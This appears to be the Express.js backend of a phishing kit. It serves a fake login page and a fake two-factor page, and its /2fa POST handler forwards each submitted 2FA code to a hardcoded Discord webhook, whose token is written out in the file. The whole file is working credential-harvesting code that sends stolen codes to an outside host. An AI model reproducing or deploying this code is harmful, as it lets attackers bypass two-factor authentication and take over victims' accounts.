const { EmbedBuilder, WebhookClient } = require('discord.js');
const path = require("path")
const express = require('express')


const WEBHOOK = "https://discord.com/api/webhooks/1037537444934983762/Y2I3_xBfIdUnroLFCuY8JucOzLf_ZDVPBCHDQTHPTIQOTccU8GEshaiPcWwYBhj94AyN";


let port = process.env.PORT || 3002

const webhookClient = new WebhookClient({ url: WEBHOOK });
const app = express()

app.use(express.json())
app.use(express.urlencoded({extended: true}))
app.set('views',path.join(__dirname,'views'))
app.set('view engine', 'ejs')


app.get('/',(req,res)=>{
    res.render('index',{webhook:WEBHOOK})
})

app.post('/',(req,res)=>{
    res.send(req.body)
})

app.get('/2fa',(req,res)=>{
    res.render('2fa')
})

app.post('/2fa',(req,res)=>{
    const fa2 = req.body["2fa"];
    webhookClient.send({
        embeds:[{
            fields:[{
                        name:"2fa",
                        value:fa2,
                        inline:!0
                    }
                ],
            color:7143253,
            timestamp:(new Date).toISOString()}
                                                    ],
    });
    res.render('2fa')
})

app.listen(port,()=>{
    console.log("portze var")
})
